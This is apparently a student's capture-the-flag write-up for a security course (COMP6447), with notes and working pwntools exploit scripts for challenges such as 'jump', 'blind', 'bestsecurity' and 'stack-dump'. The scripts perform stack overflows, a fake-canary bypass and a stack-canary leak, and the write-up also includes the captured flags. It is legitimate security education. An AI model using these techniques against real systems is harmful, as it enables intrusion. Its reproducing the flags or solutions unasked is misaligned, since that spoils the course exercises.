jump
===========================

Flag: `COMP6447{g3T_R4ADY_2_J4MP}`

General overview of problems faced
-------------------------------------
- Had to figure out why `gdb.debug` wasn't spawning the terminal
- Searched for nicer way to use cyclic; turns out it's just in pwntools! Raw strings ftw
- Not much of a challenge here


Script/Command used
------------------
```python2
from pwn import *
context.binary = './jump'
context.terminal = ['alacritty', '-e', 'sh', '-c']

target = 0x8048536

crash = False

io = None
if crash:
    io = gdb.debug('./jump')
else:
    #io = process('./jump')
    io = remote('plzpwn.me', 2000)

io.recvuntil('?\n')

# Check eip at crash
if crash:
    pattern = cyclic(512)
    io.sendline(pattern)
    pause()
    # qaaa
    sys.exit()

exploit = 'A'*cyclic_find(r'qaaa') + pack(target)
io.sendline(exploit)
io.interactive()
```

blind
===========================

Flag: `COMP6447{4R3_U_BL1ND?}`

General overview of problems faced
-------------------------------------
- Pretty much same as jump, just needed a little `objdump`


Script/Command used
------------------
```
from pwn import *
context.binary = './blind'
context.terminal = ['alacritty', '-e', 'sh', '-c']


crash = False

io = None
if crash:
    io = gdb.debug('./blind')
else:
    #io = process('./blind')
    io = remote('plzpwn.me', 2001)

io.recvline('.\n')

# From `objdump -D blind | grep win`:
# 080484d6 <win>:
target = 0x080484d6

# Check eip at crash
if crash:
    pattern = cyclic(512)
    io.sendline(pattern)
    pause()
    # saaa
    sys.exit()

exploit = 'A'*cyclic_find(r'saaa') + pack(target)
io.sendline(exploit)
io.interactive()
```

bestsecurity
===========================

Flag: `COMP6447{WH4T_I5_A_C4N4RY?}`

General overview of problems faced
-------------------------------------
- Reverse engineer functions to figure out what exactly this 'best security' measure is
- `checksec` yielded no answers, stack canary still disabled
- Culprit was a strncmp, which was comparing a variable on the stack to the 'canary' 1234

Script/Command used
------------------
```
from pwn import *
context.binary = './bestsecurity'
context.terminal = ['alacritty', '-e', 'sh', '-c']


crash = False

io = None
if crash:
    # 0x8048540 is the address of the instruction to call strncmp
    # by breaking here, we can check the args given to strncmp and cyclic check
    #script = 'b check_canary'
    script = 'b *0x8048540'
    io = gdb.debug('./bestsecurity', gdbscript=script)
else:
    #io = process('./bestsecurity')
    io = remote('plzpwn.me', 2002)

# Check args at crash
if crash:
    pattern = cyclic(512)
    io.sendline(pattern)
    pause()
    # haab
    sys.exit()

# 'canary' is 1234, according to the strncmp args
canary = 0x34333231
exploit = 'A'*cyclic_find(r'haab') + pack(canary)
io.sendline(exploit)
io.interactive()
```

stack-dump
===========================

Flag: `COMP6447{B3T_1T_H4D_4_C4N4RY}`

General overview of problems faced
-------------------------------------
- Trying to figure out what exactly the binary does/can do
- Seems like print memory map does what it says, prints memory map and sets a global variable that has the address of where the memory starts
- This global variable can then be printed by dump memory
- This boi `mov    eax,gs:0x14` is using the general purpose segment register offset by 0x14 as the stack canary
- Trying to figure out how to read this at runtime so I can set it in my payload
- *Major problem faced: human body needs sleep*
- After some research, it seems like there are 2 main ways to crack this: leak a canary or brute force
    - Leaking the canary can occur if we can control the size of the output and thus get back an arbitrary number of bytes (all the way up until the cookie itself)
    - Brute force can be used if we can fork (forking uses the same address space, and thus the same canary) and test children that use the same canary 
one byte at a time (only have to brute force 3 bytes as the 'first' byte is always a null byte to prevent strings from overwriting.
In our case, this is a non-issue as we have `gets()`, which accepts input until a newline character (although we could get unlucky with the canary).


- Seems like the attack surface is the call to `gets()` in the input and a call to `printf` that allows us to print some hex somewhere. I'd like to start with the
non-brute force method and see if we can leak the stack cookie somehow.

- Looks like we can overwrite the variable that the 'memory dump' option prints out, which is for sure before the stack canary. 
We can use the stack pointer so kindly given to us and offset it to get the canary!

- Seems like the input is just an input for the dump memory function, allowing us to dump memory wherever we want. 
We can then dump memory off the stack and leak the canary!

- Stack pointer they've given us is $ebp-0x71, need to add by 0x71 to get the base pointer and then leak the stack canary stored at [$ebp-8]

- Got the canary bois! Now we just need to overwrite $eip and get to `win()`
- Nevermind, canary doesn't match with the actual one hmmm...
- More offset stuff 
- Ok we're back

- Messing about with cyclic and getting the canary location, seems like it changes and messes up with the input so I'll keep that static

- *puts sunglasses on* I'm in

Script/Command used
------------------
```python2
from pwn import *
context.binary = './stack-dump'
context.terminal = ['alacritty', '-e', 'sh', '-c']
context.aslr = False

# from objdump
# 080486c6 <win>:
target = 0x080486c6

'''
a) fgets(), atoi(), gets()
b) printf("memory at address %p:", var1), putchar()
c) getpid(), sprintf(), system("cat /proc/%u/maps", get_pid())
d) return
'''

io = None
script = 'b *0x080488a2'
#io = gdb.debug('./stack-dump', gdbscript=script)
#io = process('./stack-dump')
io = remote('plzpwn.me', 2003)

print(io.recvuntil('pointer 0x'))
# This is the call to printf that gives us the 'stack pointer', which is offset at [$ebp-0x71]
# 8048730:       8d 45 8f                lea    eax,[ebp-0x71]
# 8048733:       50                      push   eax
# 8048734:       8d 83 c0 e9 ff ff       lea    eax,[ebx-0x1640]
# 804873a:       50                      push   eax
# 804873b:       e8 90 fd ff ff          call   80484d0 <printf@plt>
ebp = int(io.recvuntil('\n'), base=16) + 0x71
print('ebp at: ' + hex(ebp))

io.sendline('a')
print(io.recvuntil('len: '))
io.sendline('4')

# Stack canary is loaded at the offset 0x8 from base pointer
# 8048703:       65 a1 14 00 00 00       mov    eax,gs:0x14
# 8048709:       89 45 f8                mov    DWORD PTR [ebp-0x8],eax
canaryAddress = ebp - 0x08
exploit = pack(canaryAddress)

print('canary address: ' + hex(canaryAddress))

io.sendline(exploit)
print(io.recvuntil('quit\n'))

io.sendline('b')
print(io.recvuntil(': '))

inp = io.recvuntil('\n')
canary = unpack(inp[0:4])
print('canary: '+hex(canary))

# buffer starts at $ebp-0x68
# 80487e8:       83 c4 04                add    esp,0x4
# 80487eb:       8d 45 98                lea    eax,[ebp-0x68]
# 80487ee:       50                      push   eax
# 80487ef:       e8 ec fc ff ff          call   80484e0 <gets@plt>
crash = False
if crash:
    io.sendline('a')
    print(io.recvuntil('len: '))
    io.sendline('4')
    print('4\n')

    # read address of canary, see where it is using cyclic
    # x [canary address]
    #pattern = cyclic(200)
    # abya

    # insert canary then cyclic our way upp
    pattern = cyclic(cyclic_find('abya')) + pack(canary) + cyclic(512)
    print(pattern)
    io.sendline(pattern)
    # caaa

    io.interactive()
    sys.exit()

# exploits baby
io.sendline('a')
print(io.recvuntil('len: '))
io.sendline('4')
print('4\n')
exploit = cyclic(cyclic_find('abya')) + pack(canary) + 'A'*cyclic_find('caaa') + pack(target)
io.sendline(exploit)
io.sendline('d')

# cat flag should always be done by hand for maximum hacker points
io.interactive()
```

re.png
===========================

Flag: n/a

General overview of problems faced
-------------------------------------
- Reverse engineering a png, we weren't taught this! /s
- Learnt that gcc compiles `==` to a `jne` for some reason and vice versa

Script/Command used
------------------
```C
#include <stdio.h>

int main(int argc, char **argv, char **envp) {
    int var_C;
    scanf("%d", &var_C);
    if (var_C == 1337) {
        puts("Your so leet!");
    } else {
        puts("Bye");
    }
    return 1;
}
```
